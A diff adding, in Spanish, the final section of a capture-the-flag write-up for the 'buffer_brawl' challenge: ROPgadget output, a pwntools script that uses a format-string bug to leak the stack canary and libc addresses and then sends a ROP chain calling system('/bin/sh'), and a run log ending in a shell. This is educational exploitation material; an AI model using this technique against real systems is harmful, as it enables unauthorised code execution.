@@ -185,4 +185,125 @@ void stack_smash(void)
 }
 ```
 
+Haremos un ROP, para llamar a system('/bin/sh'), podemos encontrar los gadgets con ROPGadget:
+
+```
+ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6| grep "pop rax ; ret"
+
+0x00000000000436a4 : add byte ptr [rax - 0x75], cl ; add byte ptr [rbx - 0x75], bl ; pop rax ; ret
+0x00000000000436a7 : add byte ptr [rbx - 0x75], bl ; pop rax ; ret
+0x0000000000043047 : pop rax ; ret
+0x00000000001027d1 : ror byte ptr [rax - 0x7d], 0xc4 ; pop rax ; ret
+0x00000000000cd4f2 : sub al, 0x3b ; sub al, 0x75 ; pop rax ; ret
+0x00000000000cd4f5 : sub al, 0x75 ; pop rax ; ret
+
+ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6| grep "pop rdi ; jmp rax"
+0x000000000002d114 : pop rdi ; jmp rax
+```
+
+Script final:
+``` python3 
+from pwn import *
+exe = context.binary = ELF("buffer_brawl")
+libc = context.binary = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+# libc = ELF("./libc6_2.35-0ubuntu3.8_amd64.so")
+# io = connect("buffer-brawl.chal.wwctf.com", 1337)
+# io = connect("localhost",4444)
+io = process(exe.path)
+
+# 1.Obtener la direccion base del binario
+def stack_leak(p):
+    print(f"INPUT={p}")
+    io.sendline(b"4")
+    io.recvuntil(b"Right or left?\n")
+    io.sendline(p)
+    return io.recvline(keepends=False)
+
+cookie, exe_leak = stack_leak(b"%11$p %13$p").split()
+cookie = int(cookie[2:], 16)                              # Canario
+exe_leak = int(exe_leak[2:], 16)                          # Direccion filtrada
+exe.address = exe_leak - 0x1747                           # desplazamiento de la direccion de retorno a la base
+
+
+# 2.Obtener la direccion base de libc
+def leak_got(sym):
+    addr = stack_leak(b"%7$s".ljust(8, b"_") + p64(exe.got[sym]))
+    addr = u64(addr[:6] + b"\x00\x00")
+    return addr
+
+puts_addr = leak_got("puts")
+io.info(f"{leak_got("puts")=:x}")
+""""
+# Usado para encontrar la version de libc correcta en el remoto
+io.info(f"{leak_got("printf")=:x}")
+io.info(f"{leak_got("read")=:x}")
+io.info(f"{leak_got("exit")=:x}")
+""" 
+
+libc.address = puts_addr - libc.sym.puts
+
+# 3.Lanzar golpes al stack hasta dejarlo en 13
+for i in range(29):
+    io.sendlineafter(b"\n> ", b"3")
+
+
+# 4.ROP
+payload = cyclic(24)
+payload += p64(cookie)
+payload += cyclic(8)
+payload += p64(libc.address+0x0000000000043047)  # pop rax; ret
+payload += p64(libc.sym.system)                  
+payload += p64(libc.address+0x000000000002d114)  # pop rdi; jmp rax
+
+payload += p64(next(libc.search(b"/bin/sh")))    # rdi
+
+""" 
+# Otra forma mas sencilla usando el objeto rop
+rop = ROP([exe, libc])
+rop.raw(rop.ret.address)                             # Alinear el stack
+rop.call("system", [next(libc.search(b"/bin/sh"))])
+
+payload = flat(
+    cyclic(24),
+    p64(cookie),
+    cyclic(8),
+    rop.chain(),
+)
+"""
+
+
+io.sendline(payload)
+io.success("PWNED")
+io.interactive()
+```
+
+``` 
+python3 exploit.py
+[*] '/home/kalcast/Descargas/buffer_brawl'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    FORTIFY:    Enabled
+[+] Starting local process '/home/kalcast/Descargas/buffer_brawl': pid 17873
+[*] leak_got("puts")=7fb48d5c8580
+[+] PWNED
+[*] Switching to interactive mode
+
+You threw an uppercut! -3 to the stack's life points.
+
+The stack got dizzy! Now it's your time to win!
+Enter your move: 
+$ whoami
+kalcast
+$  
+```
 
